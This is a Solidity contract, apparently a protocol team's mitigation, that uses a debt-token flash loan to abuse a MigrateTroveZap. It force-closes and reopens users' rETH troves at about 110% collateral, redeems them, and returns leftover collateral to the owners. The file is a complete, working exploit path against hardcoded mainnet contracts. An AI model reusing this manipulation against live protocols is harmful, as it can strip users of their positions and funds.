pragma solidity 0.8.25;

import "contracts/token/ERC20/IERC20.sol";
import "contracts/interfaces/ITroveManager.sol";
import "contracts/interfaces/IDebtToken.sol";
import "contracts/interfaces/IBorrowerOperations.sol";

interface IMigrateTroveZap {
     function recoverERC20(IERC20 tokenAddress, uint256 tokenAmount) external;
     function transferOwnership(address newOwner) external;
}


contract VulnerableTroveRedeemer {

    IERC20 constant rETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
    IDebtToken constant debtToken = IDebtToken(0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28);
    IBorrowerOperations constant borrowerOps = IBorrowerOperations(0x72c590349535AD52e6953744cb2A36B409542719);
    ITroveManager constant tm = ITroveManager(0x0d6741f1A3A538F78009ca2e3a13F9cB1478B2d0);
    IMigrateTroveZap constant zap = IMigrateTroveZap(0xcC7218100da61441905e0c327749972e3CBee9EE);
    address constant feeReceiver = 0xfdCE0267803C6a0D209D3721d2f01Fd618e9CBF8;
    address constant owner = 0xC53baAAA8595A7A2E7Fee71dB7291b939F696734;
    address constant deployer = 0xd8531a94100f15af7521a7B6E724aC4959E0A025;

    uint256 constant DEBT_GAS_COMPENSATION = 200 * 10**18;

    constructor() {
        debtToken.approve(address(debtToken), type(uint256).max);
    }

    function redeemVulnerableTroves(address[] memory targets) external {
        require(msg.sender == owner);
        
        uint256 total; // total debt for all newly opened troves
        uint256 count; // number of newly opened troves
        
        // close and reopen all vulnerable troves
        for (uint i = 0; i < targets.length; i++) {
            uint256 amount = _closeAndOpenTroveWithMinCR(targets[i]);
            if (amount > 0) {            
                total += amount;
                count++;
            } else {
                targets[i] = address(0);
            }
        }

        // if we didn't actually close any troves, we can stop now
        if (count == 0) return;
        
        // transfer mkUSD from the fee receiver so we can redeem the vulnerable troves
        debtToken.transferFrom(feeReceiver, address(this), total);
        
        // redeem all vulnerable troves in a single call
        tm.redeemCollateral(total, address(0), address(0), address(0), 0, count, 10**18);
        
        // send the received collateral back to the fee receiver
        // MEV bots should convert back to mkUSD for us
        uint256 amount = rETH.balanceOf(address(this));
        rETH.transfer(feeReceiver, amount);

        // return the debt gas compensation to the redeemed users
        for (uint i = 0; i < targets.length; i++) {
            address target = targets[i];
            if (target != address(0)) {
                (uint debt, ) = tm.getTroveCollAndDebt(target);
                require(debt == 0, "Vulnerable trove not redeemed");
                debtToken.transfer(target, DEBT_GAS_COMPENSATION);
            }
        }

        // return ownership of the zap to the deployer
        zap.transferOwnership(deployer);
    }

    /**
        @dev Closes `target`'s existing rETH trove, and opens a new one with a CR of ~111%
     */
    function _closeAndOpenTroveWithMinCR(address target) internal returns (uint256) {
        // if the target has revoked their delegate approval, do nothing
        if (!borrowerOps.isApprovedDelegate(target, address(zap))) return 0;

        // if the target's trove no longer exists, do nothing
        (, uint256 debt) = tm.getTroveCollAndDebt(target);
        if (debt == 0) return 0;

        // calculate coll amount required to open a trove with a CR of ~110.1%
        uint256 price = tm.fetchPrice();
        uint256 newColl = (debt * 1101 / 1000) * 10**18 / price;

        // exploit the zap to close and open troves for `target`
        // the remaining coll is left in the zap
        debtToken.flashLoan(
            address(zap),
            address(debtToken),
            debt - DEBT_GAS_COMPENSATION,
            abi.encode(target, tm, tm, 10**18, newColl, 0, 0)
        );

        // recover the excess coll and return it to `target`
        uint256 amount = rETH.balanceOf(address(zap));
        zap.recoverERC20(rETH, amount);
        rETH.transfer(target, amount);

        // return the amount of debt in the new trove
        (, debt) = tm.getTroveCollAndDebt(target);
        return debt;
    }

}